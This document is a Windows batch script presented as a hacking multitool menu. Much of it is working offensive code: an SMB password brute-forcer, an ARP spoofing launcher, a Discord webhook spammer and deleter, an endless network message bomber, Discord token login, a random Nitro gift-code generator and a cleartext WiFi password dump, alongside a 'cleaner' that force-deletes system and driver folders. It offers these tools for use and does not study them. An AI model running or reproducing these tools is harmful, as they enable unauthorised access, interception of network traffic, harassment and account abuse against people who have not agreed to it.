@echo off 
title Welcome
chcp 65001 >nul
mode con: cols=100 lines=30
:hub
cls 
title Welcome 
color 3 
echo. 
echo.
echo. 
echo       ███████╗███████╗    ████████╗███████╗ █████╗ ███╗   ███╗
echo       ██╔════╝╚════██║    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
echo       █████╗      ██╔╝       ██║   █████╗  ███████║██╔████╔██║
echo       ██╔══╝     ██╔╝        ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
echo       ███████╗   ██║         ██║   ███████╗██║  ██║██║ ╚═╝ ██║
echo       ╚══════╝   ╚═╝         ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
echo. 
echo.  
echo                        1   Pinger                              
echo                        2   Arp scan 
echo                        3   Shutdown
echo                        4   IP Logger 
echo                        5   Cleaner 
echo                        6   Arp Spoof
echo                        7   Webhook Spam
echo                        8   Webhook Kill
echo                        9   SMB Bruteforce 
echo                        10  Message Bomber
echo                        11  DNS detect
echo                        12  RPC Dump
echo                        13  IP Location
echo                        14  Discord Token Login
echo                        15  Discord Nitro Gen
echo                        16  URL Shortener 
echo                        17  Wifi Pass 
echo.                         
echo. 
echo. 
set /p choice=Enter a number   :
if %choice% == 1 goto 1 
if %choice% == 2 goto 2 
if %choice% == 3 goto 3 
if %choice% == 4 goto 4 
if %choice% == 5 goto 5 
if %choice% == 6 goto 6 
if %choice% == 7 goto 7 
if %choice% == 8 goto 8
if %choice% == 9 goto 9  
if %choice% == 10 goto 10 
if %choice% == 11 goto 11 
if %choice% == 12 goto 12
if %choice% == 13 goto 13 
if %choice% == 14 goto 14 
if %choice% == 15 goto 15
if %choice% == 16 goto 16
if %choice% == 17 goto 17 

                 



:1 
title Pinger
cls 
set /p IP=Enter IP to Ping   : 
title Ping   %IP%
ping %IP%
pause 
goto hub 



:2 
title arp scan 
cls 
arp/a
pause 
goto hub 


:3 
title remote shutdown 
cls 
shutdown -i 
pause 
goto 2 


:4 
title IP Logger 
cls 
echo.
echo.
ssh -R 80:localhost:3000 serveo.net
pause 


:5 
title Cleaner 
rem Delete Temporary Files
del /s /f /q %WinDir%\Temp\*.*
del /s /f /q %WinDir%\Prefetch\*.*
del /s /f /q %Temp%\*.*
del /s /f /q %AppData%\Temp\*.*
del /s /f /q %HomePath%\AppData\LocalLow\Temp\*.*

rem Delete Used Drivers Files (Not needed because already installed)
del /s /f /q %SYSTEMDRIVE%\AMD\*.*
del /s /f /q %SYSTEMDRIVE%\NVIDIA\*.*
del /s /f /q %SYSTEMDRIVE%\INTEL\*.*

rem Delete Temporary Folders
rd /s /q %WinDir%\Temp
rd /s /q %WinDir%\Prefetch
rd /s /q %Temp%
rd /s /q %AppData%\Temp
rd /s /q %HomePath%\AppData\LocalLow\Temp

rem Delete Used Drivers Folders (Not needed because already installed)
rd /s /q %SYSTEMDRIVE%\AMD
rd /s /q %SYSTEMDRIVE%\NVIDIA
rd /s /q %SYSTEMDRIVE%\INTEL

rem Recreate Empty Temporary Folders
md %WinDir%\Temp
md %WinDir%\Prefetch
md %Temp%
md %AppData%\Temp
md %HomePath%\AppData\LocalLow\Temp

echo.
echo Windows Clean Up Done!, You can exit by pressing any key.
echo.
pause > NUL
goto hub 



:6 
title arp spoof 
echo.
cd files 
set errorlevel=0
set /p ip=Enter IP Address: 
start cmd /c "mode 87, 10 && title Spoofing %ip%... && echo. && arpspoof.exe %ip%"
goto hub 


:7 
@echo off 
title Webhook Spam
set /p "webhook=│ Enter Discord webhook URL for Message Sender: "
set /p "message=│ Enter the message to send: "
set /p "num_times=│ Enter the number of times to send the message: "

for /l %%n in (1,1,%num_times%) do (
    :: Send message to Discord webhook
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%message%\"}" %webhook%
)
pause 
goto hub 


:8 
@echo off 
title Webhook Kill
set /p "webhook=Enter Webhook URL to delete: "
curl -X DELETE %webhook%
echo Webhook deleted successfully.
pause 
goto hub 


:9 
title SMB Bruteforce
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success


:10 
title BE CAREFULL
cls 
color 4 
echo.
echo.
echo.
echo   YOU SHOULD BE CAREFUL DO NOT TRY THIS AT SCHOOL 
echo   THE MESSAGE BOMBER ONLY WORKS ON WINDOWS 10 PRO 
echo.
echo. 
echo. 
set /p choice=Are you sure you want to continue Yes or No ? :
if %choice% == Yes goto Yes
if %choice% == No goto hub

:Yes 
cls
title Message Bomber 
echo.
echo. 
set /p message=Enter message you want to spam : 
:a 
msg * %message%
goto a 


:11 
cls
echo.
set /p ip=IP Address: 
cls
echo.
echo.
echo.
for /f "tokens=2 delims= " %%a in ('nslookup %ip% ^| find "Name"') do set dns=%%a
echo.
echo Domain Name: %dns%
echo.
pause
goto hub 

:12
title RPC Dump 
cls
echo.
cd files
set /p ip=Enter IP Address: 
rpcdump %ip%
echo.
pause
cls
goto hub 


:13 
title IP Location
cls 
echo.
echo.
set /p IP=Enter IP: 
curl "https://ipinfo.io/%IP%/json" -o geolocation.json
echo ==================================
echo IP Geolocation for %IP%:
type geolocation.json
set /p xd=Do you want to delete the json file ? Yes or No  : 
if %xd% == Yes goto Yes 


:Yes 
del geolocation.json
goto hub 

:No 
goto hub 


:14
@echo off 
title Token Login 
cls 
echo.
echo.
set /p token=Enter Token to login   : 
start https://discord.com/?discordtoken=%token%
goto hub 



:15
@echo off 
cls
setlocal enabledelayedexpansion

set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "num_codes=10"
set "code_length=16"

for /l %%i in (1,1,%num_codes%) do (
    set "code="
    for /l %%j in (1,1,%code_length%) do (
        set /a "rand=!random! %% 36"
        for %%k in (!rand!) do (
            set "code=!code!!characters:~%%k,1!"
        )
    )
    echo https://discord.gift/!code!
)

endlocal
pause
goto hub 




:16
@echo off 
title URL Shortener 
cls 
echo.
echo.
set /p URL=Enter URL to shorten  : 
start http://tinyurl.com/api-create.php?url=%URL%
goto hub 


:17 
@echo off 
title Wifi Pass
cls 
echo.
echo.
netsh wlan show profile 
echo. 
set /p wifi=Enter your WiFi name:
echo.
cls 
netsh wlan show profile %wifi% key=clear
pause 
goto hub 